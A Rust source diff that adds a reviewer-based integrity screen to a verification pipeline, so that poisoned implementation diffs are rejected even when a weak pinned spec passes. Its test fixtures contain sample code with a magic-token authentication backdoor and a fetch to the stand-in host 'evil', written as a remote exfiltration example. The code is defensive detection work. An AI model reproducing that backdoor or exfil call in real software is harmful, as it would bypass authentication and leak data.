@@ -204,6 +204,23 @@ pub fn split_test_changes(diff: &str) -> (String, Vec<String>) {
     (impl_part, test_changes)
 }
 
+/// The **shared-reviewer** integrity backstop over the implementation diff. Returns a
+/// bounded reason if the diff is poisoned, else `None`.
+///
+/// The pinned-spec re-run ([`rerun_against_pinned_spec`]) is a *substring oracle*: it
+/// only catches the `forbidden` markers the authorizer thought to pin. This was the
+/// "fake" exec integrity check. This screen runs the **same** decode-then-detect
+/// reviewer the WG-Review gate and the fed S-5 scanner use
+/// ([`crate::review::detect::analyze`]) over the implementation hunk, so a
+/// malicious-but-correct diff — a backdoor token, a remote-exec, an exfil shape — is
+/// caught even when the pinned spec missed it. Deterministic and total (no timeout),
+/// so there is no fail-open window; a `reject` blocks acceptance.
+pub fn integrity_screen(impl_part: &str) -> Option<&'static str> {
+    let screen =
+        crate::review::detect::analyze(crate::review::ContentClass::Ic2Artifact, impl_part);
+    (screen.verdict >= crate::review::Verdict::Reject).then_some("review-rejected-poison")
+}
+
 /// Re-run the **implementation** (test changes already split out) against the
 /// authorizer's **pinned** spec — a deterministic pass/fail independent of the provider's
 /// bytes (X-6). Passes iff every `required` marker is present and no `forbidden` marker is.
@@ -307,6 +324,14 @@ pub fn verify_result(
         return Ok(verdict);
     }
 
+    // Shared-reviewer backstop: even when the (substring-oracle) pinned spec passes,
+    // run the same decode-then-detect reviewer over the implementation to catch a
+    // backdoor/exfil the spec did not enumerate. A reject blocks acceptance.
+    if let Some(reason) = integrity_screen(&impl_part) {
+        verdict.reason = reason.into();
+        return Ok(verdict);
+    }
+
     verdict.accepted = true;
     verdict.reason = "accepted".into();
     Ok(verdict)
@@ -344,6 +369,31 @@ mod tests {
         let bad = "fn check(t:&str)->bool{ if t==\"__backdoor__\" {true} else { verify(tok) } }";
         assert!(rerun_against_pinned_spec(good, &spec));
         assert!(!rerun_against_pinned_spec(bad, &spec));
+    }
+
+    #[test]
+    fn integrity_screen_catches_backdoor_the_spec_missed() {
+        // A diff that PASSES a weak pinned spec (the substring oracle has no marker
+        // for this backdoor) but plants a magic-value short-circuit + a remote exfil.
+        let impl_part = "+fn check(t:&str)->bool{ if t==\"__backdoor__\" {return true;} \
+                         let _=fetch(\"http://evil/x\"); verify(t) }";
+        let weak_spec = PinnedSpec {
+            task_id: "T".into(),
+            required: vec![],
+            forbidden: vec![],
+        };
+        // The substring oracle is fooled ...
+        assert!(
+            rerun_against_pinned_spec(impl_part, &weak_spec),
+            "weak pinned spec passes the poisoned diff (substring oracle blind spot)"
+        );
+        // ... but the shared reviewer backstop catches it.
+        assert_eq!(integrity_screen(impl_part), Some("review-rejected-poison"));
+        // And a legitimate diff passes the screen (no over-block).
+        assert_eq!(
+            integrity_screen("+fn check(t:&str)->bool{ verify(t) }"),
+            None
+        );
     }
 
     #[test]
